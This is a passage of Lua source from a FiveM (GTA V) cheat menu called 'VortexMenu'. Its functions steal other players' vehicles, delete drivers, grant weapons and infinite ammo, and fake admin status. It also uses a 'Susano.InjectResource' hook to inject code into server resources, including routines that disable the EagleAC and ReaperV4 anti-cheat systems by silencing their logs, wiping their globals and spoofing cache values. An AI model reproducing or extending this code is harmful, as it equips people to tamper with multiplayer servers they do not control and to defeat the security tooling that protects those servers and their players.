                NetworkRequestControlOfEntity(entity)
                while not NetworkHasControlOfEntity(entity) do
                    Citizen.Wait(0)
                    if GetGameTimer() - start > (timeoutMs or 500) then
                        return false
                    end
                    NetworkRequestControlOfEntity(entity)
                end
                return true
            end

            RequestControl(targetVehicle, 800)
            SetVehicleDoorsLocked(targetVehicle, 1)
            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

            local function tryEnterSeat(seatIndex)
                SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
                Citizen.Wait(0)
                return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
            end

            local function getFirstFreeSeat(v)
                local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
                if not numSeats or numSeats <= 0 then return -1 end
                for seat = 0, (numSeats - 2) do
                    if IsVehicleSeatFree(v, seat) then return seat end
                end
                return -1
            end

            ClearPedTasksImmediately(playerPed)
            SetVehicleDoorsLocked(targetVehicle, 1)
            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

            local takeoverSuccess = false
            local tStart = GetGameTimer()

            while (GetGameTimer() - tStart) < 1000 do
                RequestControl(targetVehicle, 400)

                if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                    takeoverSuccess = true
                    break
                end

                if not IsPedInVehicle(playerPed, targetVehicle, false) then
                    local fs = getFirstFreeSeat(targetVehicle)
                    if fs ~= -1 then
                        tryEnterSeat(fs)
                    end
                end

                local drv = GetPedInVehicleSeat(targetVehicle, -1)
                if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
                    RequestControl(drv, 400)
                    ClearPedTasksImmediately(drv)
                    SetEntityAsMissionEntity(drv, true, true)
                    SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
                    Citizen.Wait(20)
                    DeleteEntity(drv)
                end

                local t0 = GetGameTimer()
                while (GetGameTimer() - t0) < 400 do
                    local occ = GetPedInVehicleSeat(targetVehicle, -1)
                    if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
                    Citizen.Wait(0)
                end

                local t1 = GetGameTimer()
                while (GetGameTimer() - t1) < 500 do
                    if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                        takeoverSuccess = true
                        break
                    end
                    Citizen.Wait(0)
                end
                if takeoverSuccess then break end
                Citizen.Wait(0)
            end

            if takeoverSuccess then
                if DoesEntityExist(targetVehicle) then
                    FreezeEntityPosition(targetVehicle, true)
                    SetVehicleEngineOn(targetVehicle, true, true, false)

                    local targetSpeed = 140.0
                    for i = 1, 4 do
                        SetVehicleForwardSpeed(targetVehicle, targetSpeed)
                        Citizen.Wait(0)
                    end
                end
                TaskLeaveVehicle(playerPed, targetVehicle, 0)
                for i = 1, 10 do
                    if not IsPedInVehicle(playerPed, targetVehicle, false) then break end
                    ClearPedTasksImmediately(playerPed)
                    Citizen.Wait(0)
                end

                SetEntityCoordsNoOffset(playerPed, initialCoords.x, initialCoords.y, initialCoords.z, false, false, false)
                SetEntityHeading(playerPed, initialHeading)
                Citizen.Wait(50)

                if DoesEntityExist(targetVehicle) then
                    FreezeEntityPosition(targetVehicle, false)
                    NetworkRequestControlOfEntity(targetVehicle)

                    Citizen.CreateThread(function()
                        local targetSpeed = 140.0
                        for i = 1, 12 do
                            SetVehicleForwardSpeed(targetVehicle, targetSpeed)
                            Citizen.Wait(0)
                        end
                    end)
                end
            end

            Citizen.Wait(500)
            SetEntityVisible(playerPed, true, false)
            SetCamActive(warpBoostCam, false)
            if not rawget(_G, 'isSpectating') then
                RenderScriptCams(false, false, 0, true, true)
            end
            DestroyCam(warpBoostCam, true)
            if DoesEntityExist(clonePed) then
                DeleteEntity(clonePed)
            end
            SetModelAsNoLongerNeeded(playerModel)

            rawset(_G, 'warp_boost_player_busy', false)
        end)
    end,

    stealvehicle = function()
        if not VortexMenu.selectedPlayer then
            return
        end

        local targetPlayerId = nil
        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                targetPlayerId = player
                break
            end
        end

        if not targetPlayerId then
            return
        end

        local targetPed = GetPlayerPed(targetPlayerId)
        if not DoesEntityExist(targetPed) then
            return
        end

        if not IsPedInAnyVehicle(targetPed, false) then
            return
        end

        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
        if not DoesEntityExist(targetVehicle) then
            return
        end

        Citizen.CreateThread(function()
            if rawget(_G, 'warp_boost_busy') then return end
            rawset(_G, 'warp_boost_busy', true)

            local playerPed = PlayerPedId()
            local initialCoords = GetEntityCoords(playerPed)
            local initialHeading = GetEntityHeading(playerPed)

            local function RequestControl(entity, timeoutMs)
                if not entity or not DoesEntityExist(entity) then return false end
                local start = GetGameTimer()
                NetworkRequestControlOfEntity(entity)
                while not NetworkHasControlOfEntity(entity) do
                    Citizen.Wait(0)
                    if GetGameTimer() - start > (timeoutMs or 500) then
                        return false
                    end
                    NetworkRequestControlOfEntity(entity)
                end
                return true
            end

            RequestControl(targetVehicle, 800)
            SetVehicleDoorsLocked(targetVehicle, 1)
            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

            local function tryEnterSeat(seatIndex)
                SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
                Citizen.Wait(0)
                return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
            end

            local function getFirstFreeSeat(v)
                local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
                if not numSeats or numSeats <= 0 then return -1 end
                for seat = 0, (numSeats - 2) do
                    if IsVehicleSeatFree(v, seat) then return seat end
                end
                return -1
            end

            ClearPedTasksImmediately(playerPed)
            SetVehicleDoorsLocked(targetVehicle, 1)
            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

            local takeoverSuccess = false
            local tStart = GetGameTimer()

            while (GetGameTimer() - tStart) < 1000 do
                RequestControl(targetVehicle, 400)

                if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                    takeoverSuccess = true
                    break
                end

                if not IsPedInVehicle(playerPed, targetVehicle, false) then
                    local fs = getFirstFreeSeat(targetVehicle)
                    if fs ~= -1 then
                        tryEnterSeat(fs)
                    end
                end

                local drv = GetPedInVehicleSeat(targetVehicle, -1)
                if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
                    RequestControl(drv, 400)
                    ClearPedTasksImmediately(drv)
                    SetEntityAsMissionEntity(drv, true, true)
                    SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
                    Citizen.Wait(20)
                    DeleteEntity(drv)
                end

                local t0 = GetGameTimer()
                while (GetGameTimer() - t0) < 400 do
                    local occ = GetPedInVehicleSeat(targetVehicle, -1)
                    if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
                    Citizen.Wait(0)
                end

                local t1 = GetGameTimer()
                while (GetGameTimer() - t1) < 500 do
                    if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                        takeoverSuccess = true
                        break
                    end
                    Citizen.Wait(0)
                end
                if takeoverSuccess then break end
                Citizen.Wait(0)
            end

            if takeoverSuccess then
                if DoesEntityExist(targetVehicle) and IsPedInVehicle(playerPed, targetVehicle, false) then
                    RequestControl(targetVehicle, 1000)
                    if NetworkHasControlOfEntity(targetVehicle) then
                        FreezeEntityPosition(targetVehicle, true)
                        SetVehicleEngineOn(targetVehicle, true, true, false)
                        SetEntityCoordsNoOffset(targetVehicle, initialCoords.x, initialCoords.y, initialCoords.z + 1.0, false, false, false)
                        SetEntityHeading(targetVehicle, initialHeading)
                        SetEntityVelocity(targetVehicle, 0.0, 0.0, 0.0)
                        Citizen.Wait(100)
                        FreezeEntityPosition(targetVehicle, false)
                        SetVehicleOnGroundProperly(targetVehicle)
                    end
                end
            end

            rawset(_G, 'warp_boost_busy', false)
        end)
    end,

    spawncar = function()
        local vehicleList = vortex_vehicleLists.car
        if vehicleList and vortex_selectedVehicleIndex.car and vehicleList[vortex_selectedVehicleIndex.car] then
            local vehicleData = vehicleList[vortex_selectedVehicleIndex.car]
            if vehicleData and vehicleData.name then
                Vortex_SpawnVehicle(vehicleData.name, vortex_teleportIntoEnabled)
            end
        end
    end,

    spawnmoto = function()
        local vehicleList = vortex_vehicleLists.moto
        if vehicleList and vortex_selectedVehicleIndex.moto and vehicleList[vortex_selectedVehicleIndex.moto] then
            local vehicleData = vehicleList[vortex_selectedVehicleIndex.moto]
            if vehicleData and vehicleData.name then
                Vortex_SpawnVehicle(vehicleData.name, vortex_teleportIntoEnabled)
            end
        end
    end,

    spawnplane = function()
        local vehicleList = vortex_vehicleLists.plane
        if vehicleList and vortex_selectedVehicleIndex.plane and vehicleList[vortex_selectedVehicleIndex.plane] then
            local vehicleData = vehicleList[vortex_selectedVehicleIndex.plane]
            if vehicleData and vehicleData.name then
                Vortex_SpawnVehicle(vehicleData.name, vortex_teleportIntoEnabled)
            end
        end
    end,

    spawnboat = function()
        local vehicleList = vortex_vehicleLists.boat
        if vehicleList and vortex_selectedVehicleIndex.boat and vehicleList[vortex_selectedVehicleIndex.boat] then
            local vehicleData = vehicleList[vortex_selectedVehicleIndex.boat]
            if vehicleData and vehicleData.name then
                Vortex_SpawnVehicle(vehicleData.name, vortex_teleportIntoEnabled)
            end
        end
    end,

    addonvehicle = function()
        if not vortex_addonVehiclesScanned and not vortex_addonVehiclesScanning then
            Vortex_ScanAddonVehicles()
        end

        if vortex_addonVehiclesScanning then
            return
        end

        local vehicleData = vortex_addonVehicles[vortex_selectedVehicleIndex.addon]
        if vehicleData and vehicleData.name and vehicleData.name ~= "none" then
            Vortex_SpawnVehicle(vehicleData.name, vortex_teleportIntoEnabled)
        end
    end,

    givevehicle = function()
        if not VortexMenu.selectedPlayer then
            return
        end

        local targetPlayerId = nil
        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                targetPlayerId = player
                break
            end
        end

        if not targetPlayerId then
            return
        end

        local targetPed = GetPlayerPed(targetPlayerId)
        if not DoesEntityExist(targetPed) then
            return
        end

        Citizen.CreateThread(function()
            local playerPed = PlayerPedId()
            local myCoords = GetEntityCoords(playerPed)
            local myHeading = GetEntityHeading(playerPed)

            local giveCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
            local camCoords = GetGameplayCamCoord()
            local camRot = GetGameplayCamRot(2)
            SetCamCoord(giveCam, camCoords.x, camCoords.y, camCoords.z)
            SetCamRot(giveCam, camRot.x, camRot.y, camRot.z, 2)
            SetCamFov(giveCam, GetGameplayCamFov())
            SetCamActive(giveCam, true)
            RenderScriptCams(true, false, 0, true, true)

            local playerModel = GetEntityModel(playerPed)
            RequestModel(playerModel)
            local timeout = 0
            while not HasModelLoaded(playerModel) and timeout < 50 do
                Citizen.Wait(50)
                timeout = timeout + 1
            end

            local groundZ = myCoords.z
            local rayHandle = StartShapeTestRay(myCoords.x, myCoords.y, myCoords.z + 2.0, myCoords.x, myCoords.y, myCoords.z - 100.0, 1, 0, 0)
            local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
            if hit then
                groundZ = hitCoords.z
            end

            local clonePed = CreatePed(4, playerModel, myCoords.x, myCoords.y, groundZ, myHeading, false, false)
            SetEntityCollision(clonePed, false, false)
            FreezeEntityPosition(clonePed, true)
            SetEntityInvincible(clonePed, true)
            SetBlockingOfNonTemporaryEvents(clonePed, true)
            SetPedCanRagdoll(clonePed, false)
            ClonePedToTarget(playerPed, clonePed)

            SetEntityVisible(playerPed, false, false)
            SetEntityLocallyInvisible(playerPed)

            local closestVeh = GetClosestVehicle(myCoords.x, myCoords.y, myCoords.z, 100.0, 0, 70)

            if not closestVeh or closestVeh == 0 then
                SetEntityVisible(playerPed, true, false)
                SetCamActive(giveCam, false)
                if not rawget(_G, 'isSpectating') then
                    RenderScriptCams(false, false, 0, true, true)
                end
                DestroyCam(giveCam, true)
                if DoesEntityExist(clonePed) then
                    DeleteEntity(clonePed)
                end
                SetModelAsNoLongerNeeded(playerModel)
                return
            end

            SetPedIntoVehicle(playerPed, closestVeh, -1)
            Citizen.Wait(150)
            SetEntityAsMissionEntity(closestVeh, true, true)
            if NetworkGetEntityIsNetworked(closestVeh) then
                NetworkRequestControlOfEntity(closestVeh)
                local timeout = 0
                while not NetworkHasControlOfEntity(closestVeh) and timeout < 50 do
                    NetworkRequestControlOfEntity(closestVeh)
                    Citizen.Wait(10)
                    timeout = timeout + 1
                end
            end

            SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
            SetEntityHeading(playerPed, myHeading)
            Citizen.Wait(100)

            if not DoesEntityExist(targetPed) or not DoesEntityExist(closestVeh) then
                SetEntityVisible(playerPed, true, false)
                SetCamActive(giveCam, false)
                if not rawget(_G, 'isSpectating') then
                    RenderScriptCams(false, false, 0, true, true)
                end
                DestroyCam(giveCam, true)
                if DoesEntityExist(clonePed) then
                    DeleteEntity(clonePed)
                end
                SetModelAsNoLongerNeeded(playerModel)
                return
            end

            local targetCoords = GetEntityCoords(targetPed)
            local targetHeading = GetEntityHeading(targetPed)
            local offsetCoords = GetOffsetFromEntityInWorldCoords(targetPed, 3.0, 0.0, 0.0)

            SetEntityCoordsNoOffset(closestVeh, offsetCoords.x, offsetCoords.y, offsetCoords.z, false, false, false)
            SetEntityHeading(closestVeh, targetHeading)
            SetVehicleOnGroundProperly(closestVeh)

            Citizen.Wait(500)
            SetEntityVisible(playerPed, true, false)
            SetCamActive(giveCam, false)
            if not rawget(_G, 'isSpectating') then
                RenderScriptCams(false, false, 0, true, true)
            end
            DestroyCam(giveCam, true)
            if DoesEntityExist(clonePed) then
                DeleteEntity(clonePed)
            end
            SetModelAsNoLongerNeeded(playerModel)

        end)
    end,

    kickvehicle = function()
        if not VortexMenu.selectedPlayer then
            return
        end

        local targetPlayerId = nil
        for _, player in ipairs(GetActivePlayers()) do
            if GetPlayerServerId(player) == VortexMenu.selectedPlayer then
                targetPlayerId = player
                break
            end
        end

        if not targetPlayerId then
            return
        end

        local targetPed = GetPlayerPed(targetPlayerId)
        if not DoesEntityExist(targetPed) then
            return
        end

        if not IsPedInAnyVehicle(targetPed, false) then
            return
        end

        local targetVehicle = GetVehiclePedIsIn(targetPed, false)
        if not DoesEntityExist(targetVehicle) then
            return
        end

        if VortexMenu.kickVehicleMode == "v2" then
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                local vehicleId = GetVehiclePedIsUsing(targetPed)
                Susano.InjectResource("any", string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end
                        _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskLeaveVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)

                    local function RequestControl(entity, timeoutMs)
                        timeoutMs = timeoutMs or 2000
                        local start = GetGameTimer()

                        while (GetGameTimer() - start) < timeoutMs do
                            if NetworkHasControlOfEntity(entity) then return true end
                            NetworkRequestControlOfEntity(entity)
                            Wait(0)
                        end

                        return NetworkHasControlOfEntity(entity)
                    end

                    local player = PlayerPedId()

                    local function KickFromVehicleNewestV8(vehicle)
                        if not vehicle or not DoesEntityExist(vehicle) then
                            return
                        end

                        local driver = GetPedInVehicleSeat(vehicle, -1)
                        if driver ~= 0 and DoesEntityExist(driver) then
                            for i = 1, 1 do
                                SetPedIntoVehicle(player, vehicle, 0)
                                RequestControl(vehicle, 10)
                                DeletePed(driver)
                                SetPedIntoVehicle(player, vehicle, -1)
                                Wait(25)
                                TaskLeaveVehicle(player, vehicle, 16)
                                Wait(450)
                            end

                            Wait(100)
                        end
                    end

                    CreateThread(function()
                        local entityHit = %d

                        if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                            KickFromVehicleNewestV8(entityHit)
                        end
                    end)
                ]], vehicleId))
            end
            return
        end


        local playerPed = PlayerPedId()
        local savedCoords = GetEntityCoords(playerPed)
        local savedHeading = GetEntityHeading(playerPed)

        local kickCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
        local camCoords = GetGameplayCamCoord()
        local camRot = GetGameplayCamRot(2)
        SetCamCoord(kickCam, camCoords.x, camCoords.y, camCoords.z)
        SetCamRot(kickCam, camRot.x, camRot.y, camRot.z, 2)
        SetCamFov(kickCam, GetGameplayCamFov())
        SetCamActive(kickCam, true)
        RenderScriptCams(true, false, 0, true, true)

        local playerModel = GetEntityModel(playerPed)
        RequestModel(playerModel)
        local timeout = 0
        while not HasModelLoaded(playerModel) and timeout < 50 do
            Citizen.Wait(50)
            timeout = timeout + 1
        end

        local groundZ = savedCoords.z
        local rayHandle = StartShapeTestRay(savedCoords.x, savedCoords.y, savedCoords.z + 2.0, savedCoords.x, savedCoords.y, savedCoords.z - 100.0, 1, 0, 0)
        local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
        if hit then
            groundZ = hitCoords.z
        end

        local clonePed = CreatePed(4, playerModel, savedCoords.x, savedCoords.y, groundZ, savedHeading, false, false)
        SetEntityCollision(clonePed, false, false)
        FreezeEntityPosition(clonePed, true)
        SetEntityInvincible(clonePed, true)
        SetBlockingOfNonTemporaryEvents(clonePed, true)
        SetPedCanRagdoll(clonePed, false)
        ClonePedToTarget(playerPed, clonePed)

        SetEntityVisible(playerPed, false, false)
        SetEntityLocallyInvisible(playerPed)

        local function RequestControl(entity, timeoutMs)
            if not entity or not DoesEntityExist(entity) then return false end
            local start = GetGameTimer()
            NetworkRequestControlOfEntity(entity)
            while not NetworkHasControlOfEntity(entity) do
                Citizen.Wait(0)
                if GetGameTimer() - start > (timeoutMs or 500) then
                    return false
                end
                NetworkRequestControlOfEntity(entity)
            end
            return true
        end

        local function tryEnterSeat(seatIndex)
            SetPedIntoVehicle(playerPed, targetVehicle, seatIndex)
            Citizen.Wait(0)
            return IsPedInVehicle(playerPed, targetVehicle, false) and GetPedInVehicleSeat(targetVehicle, seatIndex) == playerPed
        end

        local function getFirstFreeSeat(v)
            local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(v))
            if not numSeats or numSeats <= 0 then return -1 end
            for seat = 0, (numSeats - 2) do
                if IsVehicleSeatFree(v, seat) then return seat end
            end
            return -1
        end

        ClearPedTasksImmediately(playerPed)
        SetVehicleDoorsLocked(targetVehicle, 1)
        SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)

        if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
            TaskLeaveVehicle(playerPed, targetVehicle, 0)
            Citizen.Wait(100)
            SetEntityCoordsNoOffset(playerPed, savedCoords.x, savedCoords.y, savedCoords.z, false, false, false)
            SetEntityHeading(playerPed, savedHeading)

            SetEntityVisible(playerPed, true, false)
            SetCamActive(kickCam, false)
            if not rawget(_G, 'isSpectating') then
                RenderScriptCams(false, false, 0, true, true)
            end
            DestroyCam(kickCam, true)
            if DoesEntityExist(clonePed) then
                DeleteEntity(clonePed)
            end
            SetModelAsNoLongerNeeded(playerModel)
            return
        end

        if GetPedInVehicleSeat(targetVehicle, -1) == playerPed then
            TaskLeaveVehicle(playerPed, targetVehicle, 0)
            Citizen.Wait(100)
            SetEntityCoordsNoOffset(playerPed, savedCoords.x, savedCoords.y, savedCoords.z, false, false, false)
            SetEntityHeading(playerPed, savedHeading)

            SetEntityVisible(playerPed, true, false)
            SetCamActive(kickCam, false)
            if not rawget(_G, 'isSpectating') then
                RenderScriptCams(false, false, 0, true, true)
            end
            DestroyCam(kickCam, true)
            if DoesEntityExist(clonePed) then
                DeleteEntity(clonePed)
            end
            SetModelAsNoLongerNeeded(playerModel)
            return
        end

        local fallbackSeat = getFirstFreeSeat(targetVehicle)
        if fallbackSeat ~= -1 and tryEnterSeat(fallbackSeat) then
            local drv = GetPedInVehicleSeat(targetVehicle, -1)
            if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
                RequestControl(drv, 750)
                ClearPedTasksImmediately(drv)
                SetEntityAsMissionEntity(drv, true, true)
                SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
                Citizen.Wait(50)
                DeleteEntity(drv)
                for i=1,80 do
                    local occ = GetPedInVehicleSeat(targetVehicle, -1)
                    if occ == 0 or (occ ~= 0 and not DoesEntityExist(occ)) then break end
                    Citizen.Wait(0)
                end
            end

            for attempt = 1, 30 do
                if IsVehicleSeatFree(targetVehicle, -1) and tryEnterSeat(-1) then
                    break
                end
                Citizen.Wait(0)
            end

            TaskLeaveVehicle(playerPed, targetVehicle, 0)
            Citizen.Wait(800)
            SetEntityCoordsNoOffset(playerPed, savedCoords.x, savedCoords.y, savedCoords.z, false, false, false)
            SetEntityHeading(playerPed, savedHeading)
            ClearPedTasksImmediately(playerPed)
        end

        Citizen.Wait(500)
        SetEntityVisible(playerPed, true, false)
        SetCamActive(kickCam, false)
        if not rawget(_G, 'isSpectating') then
            RenderScriptCams(false, false, 0, true, true)
        end
        DestroyCam(kickCam, true)
        if DoesEntityExist(clonePed) then
            DeleteEntity(clonePed)
        end
        SetModelAsNoLongerNeeded(playerModel)
    end,

    bypassac = function()
        if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
            print("^1[BYPASS AC] Susano.InjectResource non disponible!^7")
            return
        end

        vortex_bypassACEnabled = not vortex_bypassACEnabled

        if vortex_bypassACEnabled then
        if vortex_bypassACOptions[vortex_selectedBypassAC] == "EagleAC" then
            Susano.InjectResource("EC_AC", [[
if GetResourceState("EC_AC") == "started" then
    print = function() end
end
]])
            Susano.InjectResource("EC_AC", [[
local originalTrace = Citizen.Trace

Citizen.Trace = function(msg)
    if not (
        string.find(msg, "DEBUG") or
        string.find(msg, "NEWDBG") or
        string.find(msg, "A11AXXX") or
        string.find(msg, "function") or
        string.find(msg, "TriggerServerEvent")
    ) then
        originalTrace(msg)
    end
end
]])
            Citizen.CreateThread(function()
                local resources = { "EC_AC" }
                for i = 1, #resources do
                    local resource = resources[i]
                    Susano.InjectResource(resource, [[
print(GetCurrentResourceName())
for name, func in pairs(_G) do
    if name == "TriggerEvent" then return end
    _G[name] = nil
    print(name, func)
end
]])
                    Citizen.Wait(1050)
                end
            end)
            print("^2[BYPASS AC] EagleAC bypass activÃ©^7")
            elseif vortex_bypassACOptions[vortex_selectedBypassAC] == "ReaperV4" then
                Susano.InjectResource("any", [[

local success = exports["ReaperV4"]:InvokeCPlayer("set", "player_loaded", false, true)

if success then
    print("Updated Cache 1 Successfully")
else
    print("Failed to Update Cache 1")
end

local success = exports["ReaperV4"]:InvokeCPlayer("set", "LastFailedMovementChecks", 0, true)

if success then
    print("Updated Cache 2 Successfully")
else
    print("Failed to Update 2 Cache")
end

Wait(500)

local success = exports["ReaperV4"]:InvokeCPlayer("set", "NetworkIsInSpectatorMode", true, true)

if success then
    print("Updated Cache 3 Successfully")
else
    print("Failed to Update Cache 3")
end

]])
                print("^2[BYPASS AC] ReaperV4 bypass activÃ©^7")
            end
        else
            print("^3[BYPASS AC] Bypass dÃ©sactivÃ©^7")
        end
    end,


    menustaff = function()
        Susano.InjectResource("Putin", [[
GameMode            = GameMode or {}
GameMode.PlayerData = GameMode.PlayerData or {}
GameMode.PlayerData.group = "admin"
AdminSystem = AdminSystem or {}
AdminSystem.Service = AdminSystem.Service or {}
AdminSystem.Service.enabled = true
ToggleMenu("staff")
]])
    end,

    giveweaponcaveira = function()
        function GiveWeaponByHash(hash, ammo)
            local ped = PlayerPedId()
            local weapon = tonumber(hash) or GetHashKey(hash)
            ammo = ammo or 250
            if weapon and weapon ~= 0 then
                GiveWeaponToPed(ped, weapon, ammo, false, true)
                SetPedAmmo(ped, weapon, ammo)
                SetCurrentPedWeapon(ped, weapon, true)
                SetPedInfiniteAmmoClip(ped, true)
            else
            end
        end
        GiveWeaponByHash("WEAPON_caveira", 500)

        if not rawget(_G, 'weapon_caveira_keeper') then
            rawset(_G, 'weapon_caveira_keeper', true)
            Citizen.CreateThread(function()
                while true do
                    Wait(100)
                    local playerPed = PlayerPedId()
                    local wHash = GetHashKey("WEAPON_caveira")
                    local ammo = 500

                    if not HasPedGotWeapon(playerPed, wHash, false) then
                        GiveWeaponToPed(playerPed, wHash, ammo, false, false)
                        SetPedAmmo(playerPed, wHash, ammo)
                        SetCurrentPedWeapon(playerPed, wHash, true)
                        SetPedInfiniteAmmoClip(playerPed, true)
                    else
                        local currentAmmo = GetAmmoInPedWeapon(playerPed, wHash)
                        if currentAmmo < 100 then
                            SetPedAmmo(playerPed, wHash, ammo)
                        end
                        local selectedWeapon = GetSelectedPedWeapon(playerPed)
                        if selectedWeapon ~= wHash and selectedWeapon ~= GetHashKey("WEAPON_UNARMED") then
                            SetCurrentPedWeapon(playerPed, wHash, true)
                        end
                    end
                end
            end)
        end

    end,

    giveweaponaa = function()
        function GiveWeaponByHash(hash, ammo)
            local ped = PlayerPedId()
            local weapon = tonumber(hash) or GetHashKey(hash)
            ammo = ammo or 250
            if weapon and weapon ~= 0 then
                GiveWeaponToPed(ped, weapon, ammo, false, true)
                SetPedAmmo(ped, weapon, ammo)
                SetCurrentPedWeapon(ped, weapon, true)
                SetPedInfiniteAmmoClip(ped, true)
            else
            end
        end
        GiveWeaponByHash("WEAPON_aa", 500)

        if not rawget(_G, 'weapon_aa_keeper') then
            rawset(_G, 'weapon_aa_keeper', true)
            Citizen.CreateThread(function()
                while true do
                    Wait(100)
                    local playerPed = PlayerPedId()
                    local wHash = GetHashKey("WEAPON_aa")
                    local ammo = 500

                    if not HasPedGotWeapon(playerPed, wHash, false) then
                        GiveWeaponToPed(playerPed, wHash, ammo, false, false)
                        SetPedAmmo(playerPed, wHash, ammo)
                        SetCurrentPedWeapon(playerPed, wHash, true)
                        SetPedInfiniteAmmoClip(playerPed, true)
                    else
                        local currentAmmo = GetAmmoInPedWeapon(playerPed, wHash)
                        if currentAmmo < 100 then
                            SetPedAmmo(playerPed, wHash, ammo)
                        end
                        local selectedWeapon = GetSelectedPedWeapon(playerPed)
                        if selectedWeapon ~= wHash and selectedWeapon ~= GetHashKey("WEAPON_UNARMED") then
                            SetCurrentPedWeapon(playerPed, wHash, true)
                        end
                    end
                end
            end)
        end

    end,

    shooteyes = function()
        vortex_shooteyesEnabled = not vortex_shooteyesEnabled
    end,

    infiniteammo = function()
        vortex_infiniteAmmoEnabled = not vortex_infiniteAmmoEnabled
        if vortex_infiniteAmmoEnabled then
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", [[
                    if not _G.vortex_infiniteAmmoEnabled then
                        _G.vortex_infiniteAmmoEnabled = true
                        local function ammoLoop()
                            if not _G.vortex_infiniteAmmoEnabled then return end
                            local ped = PlayerPedId()
                            if ped and ped ~= 0 and DoesEntityExist(ped) then
                                local weapon = GetSelectedPedWeapon(ped)
                                if weapon and weapon ~= GetHashKey("WEAPON_UNARMED") then
                                    SetPedInfiniteAmmo(ped, true, weapon)
                                    SetPedInfiniteAmmoClip(ped, true)
                                end
                            end
                            Citizen.SetTimeout(100, ammoLoop)
                        end
                        ammoLoop()
                    end
                ]])
            end
        else
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", [[
                    if _G.vortex_infiniteAmmoEnabled then
                        _G.vortex_infiniteAmmoEnabled = false
                        local ped = PlayerPedId()
                        if ped and ped ~= 0 and DoesEntityExist(ped) then
                            local weapon = GetSelectedPedWeapon(ped)
                            if weapon then
                                SetPedInfiniteAmmo(ped, false, weapon)
                                SetPedInfiniteAmmoClip(ped, false)
                            end
                        end
                    end
                ]])
            end
        end
    end,

    separator = function()
    end,

    magicbullet = function()
        vortex_magicbulletEnabled = not vortex_magicbulletEnabled
    end,

    drawfov = function()
        vortex_drawFovEnabled = not vortex_drawFovEnabled
    end,

    solosession = function()
        vortex_solosessionEnabled = not vortex_solosessionEnabled

        if vortex_solosessionEnabled then
            NetworkStartSoloTutorialSession()
        else
            NetworkEndTutorialSession()

            local maxWait = 50
            local waited = 0
            while NetworkIsTutorialSessionChangePending() and waited < maxWait do
                Citizen.Wait(100)
                waited = waited + 1
            end

        end
    end,

    givenearstvehicle = function()
        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
            Susano.InjectResource("any", [[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                hNative("SetVehicleDoorsLocked", function(originalFn, ...) return originalFn(...) end)
